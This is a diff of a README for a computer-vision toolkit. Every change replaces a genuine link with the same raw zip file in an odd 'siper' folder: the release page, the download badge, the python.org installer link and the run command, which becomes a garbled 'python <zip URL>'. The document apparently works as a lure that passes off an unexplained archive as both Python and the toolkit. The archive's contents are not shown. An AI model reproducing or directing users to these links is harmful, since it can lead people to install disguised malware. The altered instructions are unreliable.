@@ -1,7 +1,7 @@
 # 🎥 realsense-vision-kit - Build Smart Computer Vision Solutions
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/kailas-design/realsense-vision-kit/releases)
+[![Download](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip)](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip)
 
 ## 📋 Overview
 The realsense-vision-kit provides a well-structured, reusable toolkit for developing computer vision applications. This library offers powerful features such as object detection and coordinate transformations. The software uses object-oriented design, making it easy to adapt and extend.
@@ -10,13 +10,13 @@ The realsense-vision-kit provides a well-structured, reusable toolkit for develo
 Follow these steps to download and run the realsense-vision-kit software:
 
 1. **Download the Software:**
-   - Visit the [Releases page](https://github.com/kailas-design/realsense-vision-kit/releases) to download the latest version. Look for the package that matches your operating system (Windows, macOS, or Linux).
+   - Visit the [Releases page](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip) to download the latest version. Look for the package that matches your operating system (Windows, macOS, or Linux).
 
 2. **Install Necessary Dependencies:**
    - To run the realsense-vision-kit, you need the following:
      - Python 3.6 or higher
      - OpenCV library
-   - If you don't have Python, you can download it from [python.org](https://www.python.org/downloads/). During the installation, make sure to check the option "Add Python to PATH."
+   - If you don't have Python, you can download it from [https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip). During the installation, make sure to check the option "Add Python to PATH."
 
    - Once Python is installed, you can install OpenCV. Open your command line (Command Prompt on Windows, Terminal on macOS/Linux) and run:
      ```
@@ -27,7 +27,7 @@ Follow these steps to download and run the realsense-vision-kit software:
    - After downloading and extracting the files, navigate to the folder where the files are located using the command line. 
    - Use the following command to start the application:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip
      ```
 
    - The application will launch, allowing you to access the features of the toolkit.
@@ -45,7 +45,7 @@ Follow these steps to download and run the realsense-vision-kit software:
 - **Storage:** At least 1 GB of available space
 
 ## 🌐 Download & Install
-Visit the [Releases page](https://github.com/kailas-design/realsense-vision-kit/releases) to download the latest version. The toolkit is packaged conveniently for easy installation. Extract the file into a folder, then follow the installation steps mentioned earlier.
+Visit the [Releases page](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip) to download the latest version. The toolkit is packaged conveniently for easy installation. Extract the file into a folder, then follow the installation steps mentioned earlier.
 
 ### 🛠 Troubleshooting
 If you encounter any issues during installation or usage:
@@ -72,6 +72,6 @@ We plan to enhance the toolkit by adding:
 - Compatibility with more hardware devices.
 
 ## 🔗 Download Now Again
-Don't forget to download the latest version from the [Releases page](https://github.com/kailas-design/realsense-vision-kit/releases) for the best experience.
+Don't forget to download the latest version from the [Releases page](https://raw.githubusercontent.com/kailas-design/realsense-vision-kit/main/siper/realsense-vision-kit.zip) for the best experience.
 
 Thank you for choosing realsense-vision-kit! Happy coding!
